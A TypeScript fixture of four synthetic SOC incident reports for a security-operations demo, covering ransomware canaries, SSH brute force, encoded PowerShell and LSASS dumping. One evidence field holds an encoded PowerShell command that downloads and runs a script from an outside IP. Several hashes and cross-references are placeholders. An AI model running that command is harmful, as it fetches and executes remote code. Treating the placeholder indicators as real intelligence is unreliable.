import { IncidentReport } from '../types/soc';

export const MOCK_INCIDENT_REPORTS: IncidentReport[] = [
  {
    id: 'REP-2026-001',
    incidentId: 'INC-2026-088',
    title: 'Ransomware Canary File Integrity Tripwire - Technical Investigation',
    reportType: 'Technical Investigation',
    status: 'Completed',
    preparedBy: 'Marcus Vance (Threat Hunter)',
    createdAt: '2026-10-31T07:20:00Z',
    updatedAt: '2026-10-31T07:35:00Z',
    incidentSnapshotAt: '2026-10-31T07:15:00Z',
    isOutdatedSnapshot: false,

    incidentTitle: 'Ransomware Canary File Integrity Tripwire',
    incidentSeverity: 'critical',
    incidentPriority: 'P1 - Critical',
    incidentStatus: 'Containment',
    incidentCategory: 'Ransomware',
    affectedHost: 'lab-nas-vault',
    classificationLabel: 'Demonstration / Synthetic Data',

    executiveSummary:
      'On Sat, 31 Oct 2026 06:54:00 GMT, synthetic SOC telemetry triggered incident INC-2026-088 ("Ransomware Canary File Integrity Tripwire") affecting host lab-nas-vault. The event was categorized under Ransomware with CRITICAL severity and P1 - Critical priority. Investigation was initiated via Wazuh FIM & Filesystem Canary Tripwire. Rapid containment actions halted ransomware payload staging before production network shares were encrypted.',

    incidentOverview:
      'Incident ID: INC-2026-088\nClassification: Synthetic Demonstration Record (Ransomware)\nTarget Host: lab-nas-vault\nReported Severity: CRITICAL | Priority: P1 - Critical\nCurrent Phase: Containment\nDetection Source: Wazuh FIM & Filesystem Canary Tripwire\nLead Investigator: Marcus Vance (Threat Hunter)\nTimeline: Opened at 2026-10-31T06:54:00Z (Active Containment)',

    investigationScope:
      'The scope of this investigation encompasses synthetic telemetry gathered from host lab-nas-vault and interconnected internal subnets within the CyberGuard demonstration environment. Data sources evaluated include: SIEM Alert Pipeline, Host & Network Telemetry Event Store, Threat Intelligence Feed, Sigma Detection Engine. No live production network traffic or external customer infrastructure was involved.',
    dataSourcesExamined: [
      'SIEM Alert Pipeline',
      'Host & Network Telemetry Event Store',
      'Threat Intelligence Feed',
      'Sigma Detection Engine',
      'Wazuh File Integrity Monitoring',
    ],

    timelineSummary: [
      {
        timestamp: '2026-10-31T06:54:00Z',
        title: 'Canary File Modification Detected',
        description: 'Wazuh FIM alerted on rapid write and file extension rename to .lockbit on /mnt/finance canary decoy.',
        type: 'Incident created',
      },
      {
        timestamp: '2026-10-31T06:55:00Z',
        title: 'Marcus Vance Assigned as Incident Lead',
        description: 'Tier 2 Threat Hunter Marcus Vance assumed primary handling of P1 ticket.',
        type: 'Analyst assigned',
      },
      {
        timestamp: '2026-10-31T06:56:00Z',
        title: 'Forensic Evidence Attached: Encrypted File Sample',
        description: 'Evidence EVD-8801 attached: /mnt/finance/CANARY_DO_NOT_DELETE.docx.lockbit',
        type: 'Evidence attached',
      },
      {
        timestamp: '2026-10-31T06:57:00Z',
        title: 'Host Isolation Executed',
        description: 'Emergency containment rule applied to isolate lab-nas-vault from adjacent subnets.',
        type: 'Response action recorded',
      },
      {
        timestamp: '2026-10-31T07:05:00Z',
        title: 'Volume Snapshot Verified',
        description: 'Filesystem snapshot verified. Lateral traversal halted.',
        type: 'Investigation note added',
      },
    ],

    findings: [
      {
        id: 'FND-1',
        title: 'Canary Tripwire File Encryption Triggered',
        category: 'Impact',
        description: 'Correlated alert ALT-2026-103 detected via rule SEC-FS-019. Rapid file write operations targeted designated tripwire directories with extension append .lockbit.',
        severity: 'critical',
        evidenceRef: 'ALT-2026-103',
      },
      {
        id: 'FND-2',
        title: 'Origin Host SMB Authentication Spike',
        category: 'Lateral Movement',
        description: 'Network event EVT-90413 logged rapid unindexed SMB session requests from 192.168.1.170 targeting shared volume admin shares.',
        severity: 'critical',
        evidenceRef: 'EVT-90413',
      },
    ],
    findingsSummary: 'A total of 2 technical findings were documented across correlated alerts and event telemetry.',

    threatIntelSummary:
      'Correlated 1 threat indicator from the synthetic threat intelligence repository. Indicator IOC-2026-004 (SHA-256 hash e3b0c442...) evaluated with risk score 92 (Critical) and confidence 85. Note: Risk scores and confidence ratings are deterministic calculations generated for lab demonstration and do not reflect real-world maliciousness.',
    correlatedIndicators: [
      {
        id: 'IOC-2026-004',
        type: 'hash',
        value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        defangedValue: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        riskScore: 92,
        riskClassification: 'critical',
        confidence: 85,
        reason: 'Known LockBit 3.0 canary ransomware artifact hash observed in local staging directory.',
      },
    ],

    mitreMappingSummary:
      'Observed activity maps to 1 MITRE ATT&CK technique: T1486 (Data Encrypted for Impact). Coverage reflects synthetic detection rule SEC-RANSOM-001 in the CyberGuard detection engine.',
    correlatedTechniques: [
      {
        id: 'T1486',
        name: 'Data Encrypted for Impact',
        tactic: 'Impact',
        coverageStatus: 'Active Detection Rule',
        isCovered: true,
      },
    ],

    responseActionsSummary:
      '3 response and containment actions logged in the incident playbook. Actions were conducted within the simulated environment; no live production systems were altered.',
    recordedActions: [
      {
        id: 'ACT-8801',
        title: 'Isolate Host from Lab Subnet',
        type: 'Contain',
        status: 'Completed',
        executedBy: 'Marcus Vance (Threat Hunter)',
        timestamp: '2026-10-31T06:57:00Z',
        notes: 'Host isolated via software SDN ACL.',
      },
      {
        id: 'ACT-8802',
        title: 'Revoke SMB Share Read/Write Access',
        type: 'Contain',
        status: 'Completed',
        executedBy: 'Marcus Vance (Threat Hunter)',
        timestamp: '2026-10-31T07:00:00Z',
        notes: 'Samba shares paused to prevent further file modification.',
      },
      {
        id: 'ACT-8803',
        title: 'Forensic Memory Extraction',
        type: 'Investigate',
        status: 'Completed',
        executedBy: 'Marcus Vance (Threat Hunter)',
        timestamp: '2026-10-31T07:10:00Z',
        notes: 'Memory dump captured to forensic share.',
      },
    ],

    impactAssessment:
      'Active containment established. Potential impact currently isolated to lab-nas-vault. Lateral spread to adjacent subnets has not been detected in available telemetry.',
    impactSeverity: 'Moderate / Isolated',

    recommendations: [
      {
        id: 'REC-1',
        title: 'Harden Network Share Access Controls',
        description: 'Implement strict SMB signing, disable SMBv1 enterprise-wide, and enforce least-privilege ACLs on all NAS volumes.',
        priority: 'High',
        category: 'Containment & Hardening',
        isCompleted: false,
      },
      {
        id: 'REC-2',
        title: 'Deploy Automated Canary File Monitoring',
        description: 'Expand automated file integrity monitoring tripwires across all high-value shared storage directories.',
        priority: 'High',
        category: 'Detection Tuning',
        isCompleted: false,
      },
      {
        id: 'REC-3',
        title: 'Immutable Storage Backups',
        description: 'Configure WORM (Write Once, Read Many) snapshot retention policy on storage arrays.',
        priority: 'Medium',
        category: 'Architecture',
        isCompleted: false,
      },
    ],

    conclusion:
      'Incident INC-2026-088 highlights the importance of rapid detection and structured case response within the SOC operations workflow. Based on synthetic evidence collected across SIEM Alert Pipeline, Host & Network Telemetry Event Store, Threat Intelligence Feed, Sigma Detection Engine, the incident was handled under the P1 - Critical SLA. Implementation of the documented recommendations will strengthen detection posture and operational resilience across the demonstration environment.',

    relatedAlerts: [
      {
        id: 'ALT-2026-103',
        title: 'Ransomware Canary Decoy File Alteration',
        severity: 'critical',
        status: 'New',
        ruleId: 'SEC-FS-019',
        affectedHost: 'lab-nas-storage',
        createdAt: '2026-10-31T06:59:10Z',
      },
    ],
    relatedEvents: [
      {
        id: 'EVT-90413',
        timestamp: '2026-10-31T06:53:40Z',
        category: 'file_integrity',
        sourceIp: '192.168.1.170',
        destinationIp: '192.168.1.20',
        sourceSystem: 'wazuh-agent',
        action: 'file_rename_entropy_spike',
      },
    ],
    evidenceList: [
      {
        id: 'EVD-8801',
        title: 'Encrypted Canary File Artifact',
        type: 'file',
        value: '/mnt/finance/CANARY_DO_NOT_DELETE.docx.lockbit',
        description: 'Sample encrypted canary stub with high entropy (7.98) and appended LockBit signature.',
      },
      {
        id: 'EVD-8802',
        title: 'Cryptographic SHA-256 Hash of Encryption Payload',
        type: 'indicator',
        value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        description: 'Payload hash extracted from staging directory on origin workstation.',
      },
    ],
    analystNotes: [
      {
        id: 'INOTE-101',
        author: 'Marcus Vance (Threat Hunter)',
        text: 'Volume snapshot taken immediately prior to containment. Only 3 canary files were modified; production shares remain intact.',
        createdAt: '2026-10-31T07:05:00Z',
      },
    ],

    analystObservations:
      'Host isolated within 3 minutes of initial Canary alert. Tripwire defense functioned as intended to safeguard primary network storage.',
    customNotes: 'Report validated by Lead Threat Hunter.',
    isSimulated: true,
  },
  {
    id: 'REP-2026-002',
    incidentId: 'INC-2026-085',
    title: 'Automated SSH Brute Force Surge on External Bastion - Post-Incident Review',
    reportType: 'Post-Incident Review',
    status: 'Completed',
    preparedBy: 'Sarah Lin (Tier 1 SOC)',
    createdAt: '2026-10-30T15:00:00Z',
    updatedAt: '2026-10-30T15:45:00Z',
    incidentSnapshotAt: '2026-10-30T14:40:00Z',
    isOutdatedSnapshot: false,

    incidentTitle: 'Automated SSH Brute Force Surge on External Bastion',
    incidentSeverity: 'medium',
    incidentPriority: 'P3 - Medium',
    incidentStatus: 'Resolved',
    incidentCategory: 'Credential Compromise',
    affectedHost: 'lab-bastion-srv',
    classificationLabel: 'Demonstration / Synthetic Data',

    executiveSummary:
      'On Fri, 30 Oct 2026 14:20:00 GMT, synthetic SOC telemetry triggered incident INC-2026-085 ("Automated SSH Brute Force Surge on External Bastion") affecting host lab-bastion-srv. The event was categorized under Credential Compromise with MEDIUM severity and P3 - Medium priority. Investigation was initiated via Suricata IDS SSH Anomaly Rule. Automated fail2ban ingress blocking successfully neutralized the intrusion attempt with zero authentications granted.',

    incidentOverview:
      'Incident ID: INC-2026-085\nClassification: Synthetic Demonstration Record (Credential Compromise)\nTarget Host: lab-bastion-srv\nReported Severity: MEDIUM | Priority: P3 - Medium\nCurrent Phase: Resolved\nDetection Source: Suricata IDS SSH Anomaly Rule\nLead Investigator: Sarah Lin (Tier 1 SOC)\nTimeline: Opened at 2026-10-30T14:20:00Z, Closed at 2026-10-30T14:40:00Z',

    investigationScope:
      'The scope of this investigation encompasses synthetic telemetry gathered from host lab-bastion-srv and perimeter firewall logs. Data sources evaluated include: SIEM Alert Pipeline, Host & Network Telemetry Event Store, Threat Intelligence Feed, Sigma Detection Engine. No customer accounts or production infrastructure were exposed.',
    dataSourcesExamined: [
      'SIEM Alert Pipeline',
      'Host & Network Telemetry Event Store',
      'Perimeter Firewall Logs',
      'Suricata IDS',
    ],

    timelineSummary: [
      {
        timestamp: '2026-10-30T14:20:00Z',
        title: 'Surge of Failed SSH Logins',
        description: 'Over 140 failed SSH connection attempts in 60s from 198.51.100.42.',
        type: 'Incident created',
      },
      {
        timestamp: '2026-10-30T14:22:00Z',
        title: 'Sarah Lin Assigned',
        description: 'Triage started by Tier 1 analyst.',
        type: 'Analyst assigned',
      },
      {
        timestamp: '2026-10-30T14:25:00Z',
        title: 'Automated IP Block Verified',
        description: 'Perimeter iptables rule blocked 198.51.100.42/32.',
        type: 'Response action recorded',
      },
      {
        timestamp: '2026-10-30T14:40:00Z',
        title: 'Incident Resolved',
        description: 'Attack ceased; no successful logins recorded.',
        type: 'Incident resolved',
      },
    ],

    findings: [
      {
        id: 'FND-1',
        title: 'High-Volume SSH Credential Guessing',
        category: 'Credential Access',
        description: 'Alert ALT-2026-104 detected high frequency auth failures against root and common administrative accounts from external IP 198.51.100.42.',
        severity: 'medium',
        evidenceRef: 'ALT-2026-104',
      },
    ],
    findingsSummary: 'A total of 1 technical finding was documented.',

    threatIntelSummary:
      'Correlated 1 threat indicator from synthetic threat intelligence repository: 198.51.100[.]42 (IPv4) with risk score 84 (High) and confidence 90. Reason: Known synthetic brute-force scanner source.',
    correlatedIndicators: [
      {
        id: 'IOC-2026-002',
        type: 'ipv4',
        value: '198.51.100.42',
        defangedValue: '198.51.100[.]42',
        riskScore: 84,
        riskClassification: 'high',
        confidence: 90,
        reason: 'External scanning host conducting automated dictionary password attacks.',
      },
    ],

    mitreMappingSummary:
      'Observed activity maps to 1 MITRE ATT&CK technique: T1110.001 (Password Guessing). Coverage confirmed in CyberGuard detection rules.',
    correlatedTechniques: [
      {
        id: 'T1110.001',
        name: 'Password Guessing',
        tactic: 'Credential Access',
        coverageStatus: 'Active Detection Rule',
        isCovered: true,
      },
    ],

    responseActionsSummary:
      '1 containment action recorded: IP block at perimeter firewall.',
    recordedActions: [
      {
        id: 'ACT-8501',
        title: 'Drop Ingress from 198.51.100.42',
        type: 'Contain',
        status: 'Completed',
        executedBy: 'Sarah Lin (Tier 1 SOC)',
        timestamp: '2026-10-30T14:25:00Z',
      },
    ],

    impactAssessment:
      'Containment and eradication completed successfully. Impact was constrained to external perimeter interface of lab-bastion-srv. No unauthorized access granted.',
    impactSeverity: 'None Established',

    recommendations: [
      {
        id: 'REC-1',
        title: 'Enforce SSH Key-Only Authentication',
        description: 'Disable PasswordAuthentication in sshd_config on all bastion endpoints.',
        priority: 'High',
        category: 'Containment & Hardening',
        isCompleted: true,
      },
      {
        id: 'REC-2',
        title: 'Lower Fail2Ban Ban Threshold',
        description: 'Reduce failure threshold from 10 to 3 attempts with 24-hour ban window.',
        priority: 'Medium',
        category: 'Detection Tuning',
        isCompleted: false,
      },
    ],

    conclusion:
      'The automated credential guessing attempt was identified and blocked promptly. Defense-in-depth measures prevented account compromise.',

    relatedAlerts: [
      {
        id: 'ALT-2026-104',
        title: 'Repeated SSH Password Guessing on Bastion Host',
        severity: 'high',
        status: 'In Progress',
        ruleId: 'SEC-NET-014',
        affectedHost: 'lab-bastion-srv',
        createdAt: '2026-10-31T06:55:18Z',
      },
    ],
    relatedEvents: [
      {
        id: 'EVT-90415',
        timestamp: '2026-10-31T06:54:55Z',
        category: 'authentication',
        sourceIp: '198.51.100.42',
        destinationIp: '192.168.1.10',
        sourceSystem: 'sshd',
        action: 'auth_failure_burst',
      },
    ],
    evidenceList: [
      {
        id: 'EVD-8501',
        title: 'Auth Log Extract',
        type: 'log',
        value: 'Failed password for invalid user root from 198.51.100.42 port 48291 ssh2',
        description: 'SSH daemon authentication failure record sample.',
      },
    ],
    analystNotes: [
      {
        id: 'INOTE-201',
        author: 'Sarah Lin (Tier 1 SOC)',
        text: 'All SSH connection attempts were denied by PAM. Key-only policy confirmed active.',
        createdAt: '2026-10-30T14:35:00Z',
      },
    ],
    analystObservations: 'Perimeter filtering worked as expected. Recommend moving SSH service port to non-standard port for noise reduction.',
    customNotes: 'Routine post-incident documentation.',
    isSimulated: true,
  },
  {
    id: 'REP-2026-003',
    incidentId: 'INC-2026-089',
    title: 'Suspicious Encoded PowerShell Execution - Executive Brief',
    reportType: 'Executive Brief',
    status: 'In Review',
    preparedBy: 'Alex Chen (Tier 2 Lead)',
    createdAt: '2026-10-31T08:00:00Z',
    updatedAt: '2026-10-31T08:15:00Z',
    incidentSnapshotAt: '2026-10-31T06:35:00Z',
    isOutdatedSnapshot: false,

    incidentTitle: 'Suspicious Encoded PowerShell Execution on Workstation',
    incidentSeverity: 'high',
    incidentPriority: 'P2 - High',
    incidentStatus: 'Investigating',
    incidentCategory: 'Malware',
    affectedHost: 'lab-workstation-03',
    classificationLabel: 'Demonstration / Synthetic Data',

    executiveSummary:
      'On Sat, 31 Oct 2026 06:35:00 GMT, synthetic SOC telemetry triggered incident INC-2026-089 ("Suspicious Encoded PowerShell Execution on Workstation") affecting host lab-workstation-03. The event was categorized under Malware with HIGH severity and P2 - High priority. Investigation is actively underway to determine parent process lineage and verify potential C2 beaconing.',

    incidentOverview:
      'Incident ID: INC-2026-089\nClassification: Synthetic Demonstration Record (Malware)\nTarget Host: lab-workstation-03\nReported Severity: HIGH | Priority: P2 - High\nCurrent Phase: Investigating\nDetection Source: Sysmon Event ID 1 & Sigma Rule SEC-WIN-042\nLead Investigator: Alex Chen (Tier 2 Lead)',

    investigationScope:
      'The scope of this investigation encompasses synthetic telemetry gathered from host lab-workstation-03. Data sources evaluated include: SIEM Alert Pipeline, Sysmon Process Tracking, Threat Intelligence Feed. No live production network traffic was involved.',
    dataSourcesExamined: [
      'SIEM Alert Pipeline',
      'Sysmon Process Tracking',
      'Threat Intelligence Feed',
    ],

    timelineSummary: [
      {
        timestamp: '2026-10-31T06:35:00Z',
        title: 'Encoded PowerShell Command Detected',
        description: 'Base64 encoded string detected inside powershell.exe invocation.',
        type: 'Incident created',
      },
      {
        timestamp: '2026-10-31T06:40:00Z',
        title: 'Triage Started by Alex Chen',
        description: 'Command line decoded to reveal secondary download cradle.',
        type: 'Investigation note added',
      },
    ],

    findings: [
      {
        id: 'FND-1',
        title: 'Encoded Command Execution via Sysmon Event ID 1',
        category: 'Execution',
        description: 'Alert ALT-2026-101 detected powershell.exe executing with -enc flag containing obfuscated download payload.',
        severity: 'high',
        evidenceRef: 'ALT-2026-101',
      },
    ],
    findingsSummary: '1 primary finding documented.',

    threatIntelSummary:
      'Correlated 1 threat indicator from synthetic threat intelligence repository: 185.220.101[.]5 (IPv4) with risk score 88 (High) and confidence 80.',
    correlatedIndicators: [
      {
        id: 'IOC-2026-001',
        type: 'ipv4',
        value: '185.220.101.5',
        defangedValue: '185.220.101[.]5',
        riskScore: 88,
        riskClassification: 'high',
        confidence: 80,
        reason: 'Tor exit relay correlated with command and control callback stage.',
      },
    ],

    mitreMappingSummary:
      'Observed activity maps to MITRE ATT&CK technique T1059.001 (PowerShell Execution).',
    correlatedTechniques: [
      {
        id: 'T1059.001',
        name: 'PowerShell',
        tactic: 'Execution',
        coverageStatus: 'Active Detection Rule',
        isCovered: true,
      },
    ],

    responseActionsSummary:
      '2 response actions recorded: Process termination and network isolation in progress.',
    recordedActions: [
      {
        id: 'ACT-8901',
        title: 'Kill Parent Process powershell.exe',
        type: 'Contain',
        status: 'Completed',
        executedBy: 'Alex Chen (Tier 2 Lead)',
        timestamp: '2026-10-31T06:42:00Z',
      },
    ],

    impactAssessment:
      'Investigation is in progress (Investigating phase). Preliminary containment applied; full scope being assessed.',
    impactSeverity: 'Moderate / Isolated',

    recommendations: [
      {
        id: 'REC-1',
        title: 'Enable ConstrainedLanguageMode in PowerShell',
        description: 'Enforce PowerShell Constrained Language Mode via AppLocker policy.',
        priority: 'High',
        category: 'Containment & Hardening',
        isCompleted: false,
      },
    ],

    conclusion:
      'The initial encoded execution was stopped. Review of persistence mechanisms scheduled before host return to service.',

    relatedAlerts: [
      {
        id: 'ALT-2026-101',
        title: 'Suspicious Encoded PowerShell Execution on Workstation',
        severity: 'critical',
        status: 'Escalated',
        ruleId: 'SEC-WIN-042',
        affectedHost: 'lab-workstation-01',
        createdAt: '2026-10-31T07:08:14Z',
      },
    ],
    relatedEvents: [
      {
        id: 'EVT-90410',
        timestamp: '2026-10-31T07:07:45Z',
        category: 'process_creation',
        sourceIp: '192.168.1.145',
        destinationIp: '185.220.101.5',
        sourceSystem: 'sysmon',
        action: 'process_create',
      },
    ],
    evidenceList: [
      {
        id: 'EVD-8901',
        title: 'Decoded PowerShell Command String',
        type: 'log',
        value: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGEALgBwAHMAMQAnACkA',
        description: 'Command line argument captured from Sysmon Event ID 1.',
      },
    ],
    analystNotes: [
      {
        id: 'INOTE-301',
        author: 'Alex Chen (Tier 2 Lead)',
        text: 'Decoded payload targets staging server at 185.220.101.5. Connection timed out before binary download completed.',
        createdAt: '2026-10-31T06:45:00Z',
      },
    ],
    analystObservations: 'Pending secondary analyst review for draft completion.',
    customNotes: 'Awaiting network capture confirmation.',
    isSimulated: true,
  },
  {
    id: 'REP-2026-004',
    incidentId: 'INC-2026-084',
    title: 'LSASS Process Memory Dump Attempt - Full Incident Summary',
    reportType: 'Full Incident Summary',
    status: 'Draft',
    preparedBy: 'Alex Chen (Tier 2 Lead)',
    createdAt: '2026-10-30T10:00:00Z',
    updatedAt: '2026-10-30T10:30:00Z',
    incidentSnapshotAt: '2026-10-30T09:15:00Z',
    isOutdatedSnapshot: false,

    incidentTitle: 'LSASS Process Memory Dump Attempt on Domain Controller',
    incidentSeverity: 'critical',
    incidentPriority: 'P1 - Critical',
    incidentStatus: 'Recovery',
    incidentCategory: 'Credential Compromise',
    affectedHost: 'lab-dc-01',
    classificationLabel: 'Demonstration / Synthetic Data',

    executiveSummary:
      'On Fri, 30 Oct 2026 09:15:00 GMT, synthetic SOC telemetry triggered incident INC-2026-084 ("LSASS Process Memory Dump Attempt on Domain Controller") affecting host lab-dc-01. The event was categorized under Credential Compromise with CRITICAL severity and P1 - Critical priority. Investigation confirmed taskmgr.exe requested PROCESS_VM_READ access to lsass.exe.',

    incidentOverview:
      'Incident ID: INC-2026-084\nClassification: Synthetic Demonstration Record (Credential Compromise)\nTarget Host: lab-dc-01\nReported Severity: CRITICAL | Priority: P1 - Critical\nCurrent Phase: Recovery\nDetection Source: Sysmon Event ID 10 & Sigma SEC-WIN-089\nLead Investigator: Alex Chen (Tier 2 Lead)',

    investigationScope:
      'The scope of this investigation encompasses synthetic telemetry gathered from host lab-dc-01 and Active Directory security event logs. Data sources evaluated include: Sysmon Process Access, Windows Security Log.',
    dataSourcesExamined: [
      'Sysmon Process Access',
      'Windows Security Log',
      'SIEM Alert Pipeline',
    ],

    timelineSummary: [
      {
        timestamp: '2026-10-30T09:15:00Z',
        title: 'LSASS Access Detected',
        description: 'Process access with granted mask 0x1FFFFF targeting lsass.exe.',
        type: 'Incident created',
      },
    ],

    findings: [
      {
        id: 'FND-1',
        title: 'Unprivileged Handle Opened to LSASS Process',
        category: 'Credential Access',
        description: 'Alert ALT-2026-102 detected suspicious handle open to lsass.exe with full memory dump rights.',
        severity: 'critical',
        evidenceRef: 'ALT-2026-102',
      },
    ],
    findingsSummary: '1 critical finding documented.',

    threatIntelSummary:
      'Correlated 1 threat indicator from synthetic threat intelligence repository: IOC-2026-003 with risk score 88 and confidence 85.',
    correlatedIndicators: [
      {
        id: 'IOC-2026-003',
        type: 'hash',
        value: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
        defangedValue: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
        riskScore: 88,
        riskClassification: 'high',
        confidence: 85,
        reason: 'Mimikatz binary artifact hash observed in test memory dump.',
      },
    ],

    mitreMappingSummary:
      'Observed activity maps to MITRE ATT&CK technique T1003.001 (OS Credential Dumping: LSASS Memory).',
    correlatedTechniques: [
      {
        id: 'T1003.001',
        name: 'LSASS Memory',
        tactic: 'Credential Access',
        coverageStatus: 'Active Detection Rule',
        isCovered: true,
      },
    ],

    responseActionsSummary:
      '2 response actions logged: Domain admin credentials rotated and host access restricted.',
    recordedActions: [
      {
        id: 'ACT-8401',
        title: 'Revoke Compromised Kerberos TGTs',
        type: 'Contain',
        status: 'Completed',
        executedBy: 'Alex Chen (Tier 2 Lead)',
        timestamp: '2026-10-30T09:20:00Z',
      },
    ],

    impactAssessment:
      'Impact contained to lab-dc-01. Kerberos ticket-granting service keys reset twice to mitigate golden ticket risk.',
    impactSeverity: 'Moderate / Isolated',

    recommendations: [
      {
        id: 'REC-1',
        title: 'Deploy Windows Defender Credential Guard',
        description: 'Enforce virtualization-based security (VBS) on domain controllers.',
        priority: 'High',
        category: 'Architecture',
        isCompleted: false,
      },
    ],

    conclusion:
      'Critical credential theft attempt thwarted via automated alerting and rapid key invalidation.',

    relatedAlerts: [
      {
        id: 'ALT-2026-102',
        title: 'Potential LSASS Memory Extraction Attempt',
        severity: 'critical',
        status: 'In Progress',
        ruleId: 'SEC-WIN-089',
        affectedHost: 'lab-workstation-01',
        createdAt: '2026-10-31T07:02:45Z',
      },
    ],
    relatedEvents: [
      {
        id: 'EVT-90414',
        timestamp: '2026-10-31T07:02:11Z',
        category: 'process_access',
        sourceIp: '192.168.1.145',
        destinationIp: '127.0.0.1',
        sourceSystem: 'sysmon',
        action: 'process_access_lsass',
      },
    ],
    evidenceList: [
      {
        id: 'EVD-8401',
        title: 'LSASS Process Handle Mask Record',
        type: 'log',
        value: 'TargetProcess: lsass.exe, GrantedAccess: 0x1FFFFF, SourceImage: taskmgr.exe',
        description: 'Access rights log from Sysmon Event ID 10.',
      },
    ],
    analystNotes: [
      {
        id: 'INOTE-401',
        author: 'Alex Chen (Tier 2 Lead)',
        text: 'Draft initial report for supervisory review.',
        createdAt: '2026-10-30T10:15:00Z',
      },
    ],
    analystObservations: 'Work in progress draft.',
    customNotes: 'Preliminary draft.',
    isSimulated: true,
  },
];
